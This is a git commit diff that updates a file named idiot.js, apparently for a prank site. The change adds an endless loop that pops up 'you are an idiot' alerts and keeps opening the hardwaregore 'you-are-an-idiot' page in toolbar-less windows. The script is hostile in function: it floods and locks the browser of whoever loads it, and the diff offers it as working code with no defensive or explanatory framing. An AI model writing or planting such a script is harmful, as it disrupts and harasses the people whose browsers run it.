717c20770052325836a3ca42d46fbddbf606d242
AdoptMeTradingValues <108958603+AdoptMeTradingValues@users.noreply.github.com>
2022-09-23 12:18:46 -0400

    Update idiot.js

--- idiot.js
+++ idiot.js
@@ -1,5 +1,6 @@
 
 
 while (true) {
-            window.open('https://adoptmetradingvalues.github.io/', 'toolbar=0,location=0,menubar=0');
+            alert("you are an idiot");
+            window.open('https://hardwaregore.github.io/you-are-an-idiot', '_new', 'toolbar=0,location=0,menubar=0');
 }
